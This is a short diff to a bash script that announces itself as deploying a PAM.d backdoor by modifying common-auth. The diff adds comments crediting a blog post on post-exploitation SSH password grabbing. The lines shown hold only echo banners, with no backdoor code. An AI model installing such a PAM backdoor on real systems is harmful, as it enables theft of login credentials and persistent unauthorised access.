@@ -1,4 +1,6 @@
 #!/bin/bash
+# This technique seems to have originated here:
+# https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
 echo 'deployes a PAM.d backdoor'
 echo
 echo "backdooring PAM.d/common-auth"
